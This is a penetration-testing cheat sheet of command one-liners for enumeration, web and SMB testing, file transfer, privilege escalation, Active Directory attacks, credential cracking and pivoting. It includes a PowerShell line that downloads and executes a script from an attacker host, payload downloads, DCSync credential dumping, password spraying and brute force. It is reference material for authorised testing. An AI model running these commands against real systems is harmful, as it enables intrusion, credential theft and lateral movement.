% Filename: 14-resources/cheatsheets/one-liners.md
% Display name: Command One-Liners
% Last update: 2026-02-11
% Authors: @TristanInSec

# Command One-Liners

## Overview

Essential one-liners for common penetration testing tasks. Organized by
activity rather than tool — grab what you need and adapt the target
parameters.

## Enumeration

```bash
# Nmap — quick TCP scan, all ports
# https://nmap.org/
nmap -p- --min-rate 5000 -oN ports.txt <target>

# Nmap — service version + default scripts on discovered ports
nmap -sV -sC -p 22,80,445 -oN services.txt <target>

# Nmap — top 100 UDP ports
sudo nmap -sU --top-ports 100 -oN udp.txt <target>

# Ping sweep (nmap)
nmap -sn 10.0.0.0/24 -oG - | grep "Up" | awk '{print $2}'

# Ping sweep (bash, no tools)
for i in {1..254}; do ping -c 1 -W 1 10.0.0.$i &>/dev/null && echo "10.0.0.$i up" & done; wait

# DNS zone transfer
dig axfr @<nameserver> <domain>

# SNMP walk (community string "public")
snmpwalk -v2c -c public <target>
```

## Web Testing

```bash
# Gobuster — directory brute-force
# https://github.com/OJ/gobuster
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -o dirs.txt

# Ffuf — virtual host enumeration
# https://github.com/ffuf/ffuf
ffuf -u http://<target> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <filter-size>

# Nikto — web vulnerability scan
# https://cirt.net/Nikto2
nikto -h http://<target> -o nikto.txt

# curl — check HTTP status and headers
curl -sI http://<target>

# curl — POST request with data
curl -s -X POST http://<target>/login -d "user=admin&pass=test" -c cookies.txt

# WhatWeb — web technology fingerprint
# https://github.com/urbanadventurer/WhatWeb
whatweb http://<target>
```

## SMB Enumeration

```bash
# NetExec — enumerate SMB shares
# https://github.com/Pennyw0rth/NetExec
netexec smb <target> -u '' -p '' --shares

# NetExec — enumerate users (null session)
netexec smb <target> -u '' -p '' --users

# smbclient — list shares
smbclient -L //<target> -N

# smbclient — connect to a share
smbclient //<target>/<share> -U '<user>%<password>'

# enum4linux-ng — comprehensive SMB enumeration
# https://github.com/cddmp/enum4linux-ng
enum4linux-ng -A <target>
```

## File Transfer

```bash
# Python HTTP server (serve current directory)
python3 -m http.server 8000

# Download with curl
curl -sLO http://<attacker>:8000/file

# Download with wget
wget -q http://<attacker>:8000/file

# Netcat file transfer (receiver)
nc -lvnp 4444 > received_file
# Netcat file transfer (sender)
nc <receiver> 4444 < file_to_send

# Base64 encode (copy-paste transfer)
base64 -w 0 file > encoded.txt
# Decode on target:
base64 -d encoded.txt > file
```

```powershell
# PowerShell — download file
# https://learn.microsoft.com/en-us/powershell/
Invoke-WebRequest -Uri "http://<attacker>:8000/file" -OutFile "C:\Users\Public\file"

# PowerShell — download and execute in memory
IEX (New-Object Net.WebClient).DownloadString("http://<attacker>:8000/script.ps1")

# certutil — download file (Windows built-in)
certutil -urlcache -split -f http://<attacker>:8000/file C:\Users\Public\file
```

## Privilege Escalation Checks

```bash
# Linux — find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Linux — find capabilities
getcap -r / 2>/dev/null

# Linux — check sudo permissions
sudo -l

# Linux — writable files in sensitive locations
find /etc /usr /var -writable -type f 2>/dev/null

# Linux — cron jobs
cat /etc/crontab; ls -la /etc/cron.*/ 2>/dev/null

# Linux — running processes (look for root services)
ps auxww | grep root
```

```powershell
# Windows — current privileges
# https://learn.microsoft.com/en-us/powershell/
whoami /priv

# Windows — check for unquoted service paths
wmic service get name,displayname,pathname,startmode 2>nul | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Windows — modifiable services (PowerShell)
Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows\*" }

# Windows — AlwaysInstallElevated check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

# Windows — stored credentials
cmdkey /list
```

## Active Directory

```bash
# NetExec — password spray
# https://github.com/Pennyw0rth/NetExec
netexec smb <dc> -u users.txt -p 'Password1' --continue-on-success

# Impacket — Kerberoasting
# https://github.com/fortra/impacket
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc> -request -outputfile kerberoast.txt

# Impacket — AS-REP roasting
impacket-GetNPUsers <domain>/ -dc-ip <dc> -usersfile users.txt -format hashcat -outputfile asrep.txt

# Impacket — DCSync
impacket-secretsdump <domain>/<user>:<password>@<dc>

# BloodHound — collect AD data
# https://github.com/SpecterOps/BloodHound
bloodhound-python -u <user> -p '<password>' -d <domain> -dc <dc> -c All
```

## Credential Attacks

```bash
# Hashcat — crack NTLM hashes
# https://hashcat.net/hashcat/
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Hashcat — crack Kerberoast (TGS-REP etype 23)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Hashcat — crack AS-REP (etype 23)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# John the Ripper — auto-detect hash type
# https://www.openwall.com/john/
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hydra — SSH brute-force
# https://github.com/vanhauser-thc/thc-hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target>
```

## Pivoting

```bash
# Chisel — SOCKS proxy through compromised host
# https://github.com/jpillora/chisel
# Attacker:
chisel server --reverse --socks5 --port 8080
# Target:
./chisel client <attacker>:8080 R:socks

# SSH — dynamic port forwarding (SOCKS proxy)
ssh -D 1080 -N user@<pivot>

# SSH — local port forwarding
ssh -L 8080:<internal-target>:80 -N user@<pivot>

# SSH — remote port forwarding
ssh -R 4444:127.0.0.1:4444 -N user@<pivot>

# Proxychains — route tools through SOCKS proxy
# Edit /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains4 nmap -sT -p 445 <internal-target>
```

## Encoding and Hashing

```bash
# Base64 encode / decode
echo -n "payload" | base64
echo "cGF5bG9hZA==" | base64 -d

# URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('test&string=value'))"

# MD5 hash
echo -n "password" | md5sum | awk '{print $1}'

# SHA256 hash a file
sha256sum /path/to/file

# Generate random password (32 chars)
openssl rand -base64 32
```

## References

### Further Reading

- [Nmap](https://nmap.org/)
- [Hashcat](https://hashcat.net/hashcat/)
- [Impacket](https://github.com/fortra/impacket)
